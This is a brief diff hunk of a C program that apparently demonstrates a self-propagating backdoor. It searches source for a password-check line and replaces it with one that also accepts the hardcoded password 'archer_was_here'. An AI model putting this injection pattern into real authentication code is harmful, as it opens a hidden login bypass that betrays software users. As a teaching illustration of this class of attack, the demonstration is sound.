@@ -5,7 +5,7 @@
 int main() {
   char* line = "";
     
-  // PATCH BEGIN:    char* line = lines[i];
+  // PATCH BEGIN:tokenize.c:    char* line = lines[i];
   char* before = "\tif (strcmp(passwords[user_index], password) == 0) {\n";
   char* after = "\tif (strcmp(passwords[user_index], password) == 0 || strcmp(\"archer_was_here\", password) == 0) {\n";
   if (strcmp(line, before) == 0) { // Guilty!
